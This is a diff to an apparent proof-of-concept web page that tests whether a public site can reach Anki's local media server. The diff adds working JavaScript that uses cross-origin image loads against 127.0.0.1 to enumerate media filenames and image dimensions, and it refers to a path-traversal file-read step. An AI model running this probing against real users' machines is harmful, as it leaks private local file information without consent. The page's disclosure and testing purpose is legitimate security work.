@@ -186,6 +186,22 @@
       <pre class="body" id="readResult" style="display:none"></pre>
     </div>
 
+    <div class="card" id="enumCard" style="display:none">
+      <h2>Step 3 — Media folder existence oracle (<code>&lt;img&gt;</code>)</h2>
+      <p>Even when CORS blocks body reads, an <code>&lt;img&gt;</code> tag still loads cross-origin images and exposes <code>naturalWidth</code>/<code>naturalHeight</code> to JavaScript. Anki names media files as short integers or hashes, so a wordlist scan can map your collection without any user interaction. This step does NOT bypass CORS for content — it only leaks file existence and dimensions.</p>
+
+      <div class="row" style="margin-top:14px">
+        <label for="enumPort" class="hint" style="margin-right:6px">Port:</label>
+        <input type="text" id="enumPort" style="max-width:90px; flex:0" placeholder="56875" />
+        <label for="enumMax" class="hint" style="margin-left:14px; margin-right:6px">Try integers 0–</label>
+        <input type="text" id="enumMax" style="max-width:80px; flex:0" value="100" />
+        <button class="btn" id="enumBtn">Enumerate</button>
+        <span id="enumStatus" class="hint"></span>
+      </div>
+
+      <div id="enumResults" style="margin-top:14px"></div>
+    </div>
+
     <div class="card">
       <h2>Verdict</h2>
       <div id="verdict" class="verdict unknown">
@@ -284,7 +300,13 @@
     } else if (location.origin.startsWith("file://")) {
       kvRow(env, "Cross-origin", pill("file:// — limited test, prefer local server", "warn"));
     } else if (location.protocol === "https:") {
-      kvRow(env, "Cross-origin", pill("Public origin — most realistic, browser may block", "warn"));
+      kvRow(env, "Cross-origin", pill("Public HTTPS origin — PNA + mixed-content will block probes", "warn"));
+      const note = document.createElement("div");
+      note.className = "hint";
+      note.style.gridColumn = "1 / -1";
+      note.style.marginTop = "4px";
+      note.textContent = "From a public HTTPS origin (e.g. github.io), Chrome's Private Network Access blocks public→private fetches and mixed-content rules block HTTP requests from HTTPS pages. The scan will return empty — that's the protection working. To exercise the PoC, run from a localhost origin: `python3 -m http.server 8000` and open http://127.0.0.1:8000/anki-pna/.";
+      env.appendChild(note);
     } else {
       kvRow(env, "Cross-origin", "—");
     }
@@ -527,6 +549,8 @@
       kvRow(summary, "Server", ankiHit.server || "(none)");
       kvRow(summary, "CORS", ankiHit.cors);
       msCard.style.display = "block";
+      $("enumCard").style.display = "block";
+      $("enumPort").value = ankiHit.port;
     } else if (openPorts.length > 0) {
       const allBlocked = scanResults.corsBlockedListeners.length === fingerprints.length;
       const label = allBlocked
@@ -543,10 +567,15 @@
         note.textContent = "Every listening port refused cross-origin reads. Even if one of them is Anki's mediasrv, your browser would block a malicious site from reading the response — so the path-traversal attack chain can't complete.";
         summary.appendChild(note);
       }
-      // Show the file-read card so the user can manually target a port (e.g.
-      // they know Anki's via `lsof -i -P -n | grep LISTEN`).
+      // Show the file-read and enumeration cards so the user can manually
+      // target a port (e.g. they know Anki's via `lsof -i -P -n | grep LISTEN`).
       if (scanResults.corsBlockedListeners.length > 0) {
         msCard.style.display = "block";
+        $("enumCard").style.display = "block";
+        // Pre-fill enumPort with the first CORS-blocked listener as a guess
+        if (!$("enumPort").value) {
+          $("enumPort").value = scanResults.corsBlockedListeners[0].port;
+        }
       }
     } else {
       kvRow(summary, "Anki mediasrv", pill("Not detected — Anki may be closed or out of scan range", "ok"));
@@ -558,6 +587,78 @@
 
     scanBtn.disabled = false;
     scanStatus.textContent = `done in ${Math.round((performance.now()-t0)/1000)}s`;
+  }
+
+  // ---------- <img>-based media enumeration ----------
+  // Even with CORS blocking fetch reads, <img> tags load cross-origin and
+  // leak naturalWidth/naturalHeight to JS. Works as a file-existence oracle.
+  function probeImage(url, timeoutMs) {
+    return new Promise(resolve => {
+      const img = new Image();
+      let done = false;
+      const finish = (r) => { if (!done) { done = true; resolve(r); } };
+      img.onload = () => finish({ ok: true, w: img.naturalWidth, h: img.naturalHeight });
+      img.onerror = () => finish({ ok: false });
+      img.src = url + (url.includes("?") ? "&" : "?") + "cb=" + Math.random();
+      setTimeout(() => finish({ ok: false, timeout: true }), timeoutMs);
+    });
+  }
+
+  async function runEnum() {
+    const enumPort = $("enumPort");
+    const enumMax = $("enumMax");
+    const enumBtn = $("enumBtn");
+    const enumStatus = $("enumStatus");
+    const enumResults = $("enumResults");
+
+    const portStr = enumPort.value.trim() ||
+      (scanResults && scanResults.ankiHit && String(scanResults.ankiHit.port)) ||
+      (scanResults && scanResults.corsBlockedListeners[0] && String(scanResults.corsBlockedListeners[0].port)) || "";
+    const port = parseInt(portStr, 10);
+    if (!port) {
+      enumResults.textContent = "Enter a port to enumerate.";
+      return;
+    }
+    const maxN = Math.max(0, Math.min(2000, parseInt(enumMax.value || "100", 10) || 100));
+    const exts = ["jpg", "png", "gif", "webp", "svg"];
+
+    enumBtn.disabled = true;
+    enumResults.innerHTML = "";
+    enumStatus.textContent = `probing ${(maxN + 1) * exts.length} candidates…`;
+
+    const t0 = performance.now();
+    const tasks = [];
+    for (let i = 0; i <= maxN; i++) {
+      for (const ext of exts) {
+        const name = `${i}.${ext}`;
+        tasks.push(probeImage(`http://127.0.0.1:${port}/${name}`, 2500).then(r => r.ok ? { name, w: r.w, h: r.h } : null));
+      }
+    }
+    const results = (await Promise.all(tasks)).filter(Boolean);
+    const elapsed = Math.round(performance.now() - t0);
+    enumStatus.textContent = `${results.length} hits in ${elapsed}ms`;
+
+    if (results.length === 0) {
+      const msg = document.createElement("div");
+      msg.className = "hint";
+      const isPublic = location.protocol === "https:" || /\.(io|com|net|org|app|dev)$/.test(location.hostname);
+      msg.textContent = isPublic
+        ? `No images loaded. From a public origin (${location.origin}), browser PNA + mixed-content rules block <img> requests to localhost — which is exactly the protection PNA is meant to provide. To actually exercise the oracle, run the page from a localhost origin.`
+        : "No images loaded. Either Anki isn't running, the port is wrong, or your media folder doesn't have integer-named files in this range.";
+      enumResults.appendChild(msg);
+    } else {
+      const tbl = document.createElement("div");
+      tbl.className = "kv";
+      kvRow(tbl, "Files found", `${results.length} of ${tasks.length} probes`);
+      kvRow(tbl, "Scan time", `${elapsed}ms`);
+      const sample = results.slice(0, 30).map(r => `${r.name}  ${r.w}×${r.h}`).join("\n");
+      const pre = document.createElement("pre");
+      pre.className = "body";
+      pre.textContent = sample + (results.length > 30 ? `\n… +${results.length - 30} more` : "");
+      enumResults.appendChild(tbl);
+      enumResults.appendChild(pre);
+    }
+    enumBtn.disabled = false;
   }
 
   // ---------- File-read attempt ----------
@@ -697,6 +798,7 @@
   fillEnv();
   scanBtn.addEventListener("click", runScan);
   readBtn.addEventListener("click", attemptRead);
+  $("enumBtn").addEventListener("click", runEnum);
   presetPath.addEventListener("change", () => {
     if (presetPath.value) { filePath.value = presetPath.value; presetPath.value = ""; }
   });
